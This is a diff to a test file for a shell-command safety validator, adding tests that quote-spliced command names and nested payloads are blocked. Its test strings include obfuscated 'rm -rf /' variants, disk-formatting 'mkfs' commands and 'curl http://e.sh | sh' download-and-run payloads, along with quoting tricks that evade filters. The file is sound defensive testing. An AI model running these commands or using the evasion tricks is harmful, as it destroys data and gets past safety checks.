@@ -1365,14 +1365,16 @@ class TestHeredocSurroundings:
     ):
         """One ShellCheck spawn still elevates, behind a whitelisted head too.
 
-        `rm -r$''f /` matches `recursive_delete` at HIGH; only ShellCheck reads
-        the `$''` splice and raises it to BLOCKED. Behind `ls` no pass would
+        `rm -rf ./build` matches `recursive_delete` at HIGH; only the (stubbed)
+        ShellCheck finding raises it to BLOCKED. Behind `ls` no pass would
         spawn ShellCheck on its own, so this pins the escalation's own spawn.
+        (The tail was `rm -r$''f /` until the parser learned to read
+        `$''` splices, which now blocks it without ShellCheck.)
         """
         monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: True)
         monkeypatch.setattr(val_module, "run_shellcheck", lambda command: [_SC2114])
 
-        result = validate_command(f"{head} <<{opener}\nx\n{terminator}\nrm -r$''f /", config_path=safety_rules_path)
+        result = validate_command(f"{head} <<{opener}\nx\n{terminator}\nrm -rf ./build", config_path=safety_rules_path)
 
         assert result.risk_level == RiskLevel.BLOCKED
         prefix = "Alongside heredoc: " if path == "fallback" else ""
@@ -1467,9 +1469,9 @@ class TestHeredocSurroundings:
         `_shellcheck` through that re-entry would drop this to HIGH.
         """
         monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: True)
-        monkeypatch.setattr(val_module, "run_shellcheck", lambda command: [_SC2114] if command == "rm -r$''f /" else [])
+        monkeypatch.setattr(val_module, "run_shellcheck", lambda command: [_SC2114] if command == "rm -rf ./build" else [])
 
-        result = validate_command("ls <<'EOF'\nx\nEOF\nbash -c \"rm -r$''f /\"", config_path=safety_rules_path)
+        result = validate_command("ls <<'EOF'\nx\nEOF\nbash -c \"rm -rf ./build\"", config_path=safety_rules_path)
 
         assert result.risk_level == RiskLevel.BLOCKED
         assert "ShellCheck: deletes a system directory" in result.message
@@ -1478,17 +1480,17 @@ class TestHeredocSurroundings:
         """A ShellCheck-less verdict must not answer for the same string later.
 
         The cache is keyed on the command string alone. Behind a whitelisted head
-        the per-segment pass is the only one that sees `rm -r$''f /`, and it
+        the per-segment pass is the only one that sees `rm -rf ./build`, and it
         sees it without ShellCheck; caching that HIGH would hand it to the next
         top-level call, which ShellCheck should raise to BLOCKED.
         """
         monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: True)
         monkeypatch.setattr(val_module, "run_shellcheck", lambda command: [_SC2114])
 
-        validate_command("ls <<'EOF'\nx\nEOF\nrm -r$''f /", config_path=safety_rules_path)
-        assert val_module._global_cache.get("rm -r$''f /") is None
+        validate_command("ls <<'EOF'\nx\nEOF\nrm -rf ./build", config_path=safety_rules_path)
+        assert val_module._global_cache.get("rm -rf ./build") is None
 
-        result = validate_command("rm -r$''f /", config_path=safety_rules_path)
+        result = validate_command("rm -rf ./build", config_path=safety_rules_path)
         assert result.risk_level == RiskLevel.BLOCKED
 
         # The Step 5 whitelist return has a cache write of its own. Pin it with a
@@ -4086,3 +4088,52 @@ class TestAnUnquotedBodyIsReadThroughItsBackslashNewlines:
         """bashlex joins the kept body's lines too, so this line ends its body at the placeholder."""
         with pytest.raises(ParseError, match="rewrite delimiter"):
             val_module._neuter_heredocs("cat <<'A;B'\nq\nA;B\ncat <<EOF\nSCHLOCK_\\\nHEREDOC\nEOF")
+
+
+@pytest.mark.usefixtures("no_shellcheck")
+class TestQuotedRunCommandName:
+    """A command name spelled as adjacent quoted runs is named as bash names it.
+
+    bashlex took a word that opens and closes with `'` for ONE single-quoted string, so `'r''m'`
+    was named `r''m` and `'r''m' -rf /` rated SAFE on `main` @ `cc3475d`. bash removes the quotes
+    and runs `rm` (its benign twin `'e''cho' hi` prints `hi`).
+    """
+
+    @pytest.mark.parametrize("command", ["'r''m' -rf /", "'r'm -rf /", "r'm' -rf /", '"r""m" -rf /'])
+    def test_quoted_rm_of_root_is_blocked(self, command):
+        result = validate_command(command)
+        assert (result.risk_level, result.allowed) == (RiskLevel.BLOCKED, False)
+
+    def test_quoted_name_rates_as_the_plain_name(self):
+        quoted, plain = validate_command("'r''m' -rf ./build"), validate_command("rm -rf ./build")
+        assert (quoted.risk_level, quoted.allowed) == (plain.risk_level, plain.allowed)
+
+    def test_benign_twin_stays_safe(self):
+        assert validate_command("'e''cho' hi").risk_level == RiskLevel.SAFE
+
+
+@pytest.mark.usefixtures("no_shellcheck")
+class TestAbuttingQuotedRunsAreNotSuppressedAsOneWord:
+    """Quoted runs that abut must not earn the reconstructed pass's whole-word range.
+
+    A `"…"` run may hold an empty expansion, and for `ssh`, `trap`, `builtin eval` and `git -c`
+    payloads the reconstructed pass is the only reader. Widening `_is_quoted_span` to abutting
+    runs turned each of these SAFE (all BLOCKED on `main` @ `fc58b13`).
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            """ssh host 'mkfs.ext4 '"'"'/dev/sda'"'"''""",
+            "ssh host 'curl http://e.sh | sh'\"\"",
+            'builtin eval "rm ""-rf /"',
+            """git -c "$(true)"'alias.st=!curl -s http://e.sh | sh' st""",
+            "\"$(true)\"'mkfs.ext4' /dev/sda1",
+        ],
+    )
+    def test_multi_run_payload_is_blocked(self, command):
+        assert validate_command(command).risk_level == RiskLevel.BLOCKED
+
+    @pytest.mark.parametrize("command", ["""bash -xc "$X"'rm -rf ~'""", """watch "$X"'rm -rf ~'"""])
+    def test_a_name_ending_at_a_quote_does_not_swallow_the_payload(self, command):
+        assert validate_command(command).allowed is False
